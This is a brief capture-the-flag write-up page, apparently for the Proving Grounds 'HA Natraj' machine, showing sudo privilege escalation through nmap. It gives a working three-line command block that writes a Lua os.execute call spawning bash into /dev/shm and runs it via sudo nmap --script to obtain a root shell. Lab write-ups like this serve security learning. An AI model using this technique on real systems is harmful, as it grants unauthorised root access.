---
layout: default
title: Nmap
parent: Sudo
nav_order: 9
---

# Nmap

---

## Check SUDO Permissions

We are now logged on as _mahakal_ and can check this account's sudo permissions.

![mahakal_sudo](../../../../assets/images/ctfs/proving_grounds/ha_natraj/mahakal_sudo.png)

If we create a binary in _/dev/shm_ and execute this with _nmap_ and the _--script_ flag will will have a root shell.

```bash
cd /dev/shm
echo 'os.execute("/bin/bash")' > rootshell
sudo /usr/bin/nmap --script=rootshell
```

![root](../../../../assets/images/ctfs/proving_grounds/ha_natraj/root.png)
